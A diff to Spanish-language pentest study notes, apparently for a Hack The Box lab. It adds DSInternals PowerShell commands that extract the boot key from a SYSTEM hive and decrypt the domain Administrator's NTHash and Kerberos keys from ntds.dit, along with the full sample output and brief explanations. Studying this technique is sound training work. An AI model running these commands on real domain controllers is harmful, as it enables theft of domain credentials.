@@ -236,11 +236,75 @@ C:\htb> reg save HKLM\SAM SAM.SAV
 ### Usando DSInternals (PowerShell)
 
 ```powershell
-PS C:\htb> Import-Module .\DSInternals.psd1
-PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
-PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=Administrator,CN=Users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=Administrator,CN=Users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
 # Muestra NTHash, Kerberos keys, etc.
+
+DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+Sid: S-1-5-21-669053619-2741956077-1013132368-500
+Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
+SamAccountName: Administrator
+SamAccountType: User
+UserPrincipalName:
+PrimaryGroupId: 513
+SidHistory:
+Enabled: True
+UserAccountControl: NormalAccount, PasswordNeverExpires
+AdminCount: True
+Deleted: False
+LastLogonDate: 5/6/2021 5:40:30 PM
+DisplayName:
+GivenName:
+Surname:
+Description: Built-in account for administering the computer/domain
+ServicePrincipalName:
+SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
+DiscretionaryAclProtected, SelfRelative
+Owner: S-1-5-21-669053619-2741956077-1013132368-512
+Secrets
+  NTHash: cf3a5525ee9414229e66279623ed5c58
+  LMHash:
+  NTHashHistory:
+  LMHashHistory:
+  SupplementalCredentials:
+    ClearText:
+    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
+    Kerberos:
+      Credentials:
+        DES_CBC_MD5
+          Key: d60dfbbf20548938
+      OldCredentials:
+      Salt: WIN-NB4NGP3TKNKAdministrator
+      Flags: 0
+    KerberosNew:
+      Credentials:
+        AES256_CTS_HMAC_SHA1_96
+          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
+          Iterations: 4096
+        AES128_CTS_HMAC_SHA1_96
+          Key: 94c300d0e47775b407f2496a5cca1a0a
+          Iterations: 4096
+        DES_CBC_MD5
+          Key: d60dfbbf20548938
+          Iterations: 4096
+      OldCredentials:
+      OlderCredentials:
+      ServiceCredentials:
+      Salt: WIN-NB4NGP3TKNKAdministrator
+      DefaultIterationCount: 4096
+      Flags: 0
+    WDigest:
+Key Credentials:
+Credential Roaming
+  Created:
+  Modified:
+  Credentials:
 ```
+
+- `Get-BootKey` obtiene la boot key desde el hive `SYSTEM`.
+- `Get-ADDBAccount` abre la DB `ntds.dit` y desencripta secretos usando la boot key.****
+- `DistinguishedName` es una cadena que identifica únicamente a un objeto dentro del árbol de Active Directory. Va desde el nombre del propio objeto hasta la raíz del dominio, indicando contenedores intermedios. La cadena se lee de izquierda a derecha representando desde lo más específico (el objeto) hacia lo más general (el dominio).
 
 ### Usando Impacket `secretsdump.py` (offline)
 
